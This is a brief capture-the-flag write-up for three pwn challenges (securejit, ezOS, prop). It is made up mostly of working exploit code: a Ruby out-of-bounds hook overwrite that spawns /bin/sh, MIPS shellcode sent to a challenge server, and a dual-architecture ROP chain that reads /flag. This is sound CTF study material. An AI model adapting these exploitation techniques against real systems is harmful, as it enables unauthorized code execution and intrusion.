## securejit

Apparently there are some memory corruption bugs in this rubi project. We make it out by OOB.

```ruby
a = Array(1000)
free(a)

libc = a[0] - 1935320
puts libc

oneg = libc + 324546
syst = libc + 250448
hook = libc + 1939664

diff = hook - a
puts diff
diff = diff / 4
puts diff

puts a
a[diff] = syst

x = "/bin/sh"
puts x
free(x)
```

## ezOS

Unexpected solution lol. This OS doesn't have any pagination isolation between user and kernel mode. So we can just print the flag in the kernel memory.

```python
from pwn import *
context.arch = 'mips'
context.endian = 'big'
context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

stack = 0x700ffdc4

shellcode = """
    li $a0, 0xe
    li $a1, 1
    li $a2, 0xbfcfff00
    li $v1, 0x401150
    jr $v1
    li $a3, 100
"""

sh = 'a'*20 + p32(stack + 4)
sh += asm(shellcode)
sh = sh.ljust(0x200, '\x00')

#r = process("./run.sh")
r = remote("chall.0ops.sjtu.edu.cn", 9999)

r.sendafter("running!\n", sh)
r.interactive()
```

## prop

Just solve two architecture -- i386 and x86-64.

```python
from pwn import *
context.arch = 'i386'
context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

raddr = 0x13370000
saddr = 0x73310000

pop_rdi = raddr + 0x169a6
pop_rsi = raddr + 0x4547
pop_rdx = raddr + 0xe547
pop_rax = raddr + 0xf547
pop_rcx = raddr + 0x168b8
pop_rbx = raddr + 0x21d47

pop_rbp = raddr + 0x2d47

mov_edi_eax = raddr + 0x3940dd
mov_edx_eax = raddr + 0x21ec638
mov_ebx_eax = raddr + 0x74ae22
mov_ecx_eax = raddr + 0x1293eb5
ret = raddr + 0x1fb

syscall32 = raddr + 0xdab658
syscall64 = raddr + 0x245c73

bss = saddr + 0x800
flagaddr = saddr + 0x500

chain = flat([
    pop_rbp, 0, pop_rbx, flagaddr,
    pop_rbp, 0, pop_rcx, 0,
    pop_rbp, 0, pop_rdx, 0,
    pop_rbp, 0, pop_rax, 5,
    pop_rbp, 0, syscall32, ret,

    pop_rbp, 0, mov_ebx_eax, ret,
    pop_rbp, 0, pop_rcx, bss,
    pop_rbp, 0, pop_rdx, 64,
    pop_rbp, 0, pop_rax, 3,
    pop_rbp, 0, syscall32, ret,

    pop_rbp, 0, mov_edx_eax, ret,
    pop_rbp, 0, pop_rbx, 1,
    pop_rbp, 0, pop_rcx, bss,
    pop_rbp, 0, pop_rax, 4,
    pop_rbp, 0, syscall32, ret,

    pop_rbp, 0, pop_rbx, 0,
    pop_rbp, 0, pop_rax, 1,
    pop_rbp, 0, syscall32, ret,

])

chain += flat([
    pop_rdi, flagaddr,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 2,
    syscall64,

    mov_edi_eax,
    pop_rsi, bss,
    pop_rdx, 64,
    pop_rax, 0,
    syscall64,

    mov_edx_eax,
    pop_rdi, 1,
    pop_rsi, bss,
    pop_rax, 1,
    syscall64,

    pop_rdi, 0,
    pop_rax, 60,
    syscall64
    ], word_size=64)

chain = chain.ljust(0x500, '\x00') + "/flag"

with open("chain", 'w') as f:
    f.write(chain)
```
